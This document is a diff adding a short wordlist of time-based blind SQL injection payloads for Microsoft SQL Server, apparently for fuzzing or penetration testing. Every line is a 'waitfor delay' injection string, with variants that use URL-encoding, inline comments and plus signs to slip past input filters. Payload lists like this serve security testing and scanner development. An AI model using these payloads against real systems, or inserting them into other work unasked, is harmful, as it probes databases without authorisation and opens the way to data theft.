@@ -1,0 +1,12 @@
+waitfor delay '0:0:10'--
++waitfor+delay+'0:0:10'--
+/**/waitfor/**/delay/**/'0:0:10'--
+%20waitfor%20delay%20'0:0:20'--
+ waitfor delay '0:0:10'/*
++waitfor+delay+'0:0:10'/*
+/**/waitfor/**/delay/**/'0:0:10'/*
+%20waitfor%20delay%20'0:0:20'/*
+'  waitfor delay '0:0:10'--+
+'+waitfor+delay+'0:0:10'--+
+'/**/ waitfor/**/delay/**/'0:0:10'--+
+'%20waitfor%20delay%20'0:0:20'--+
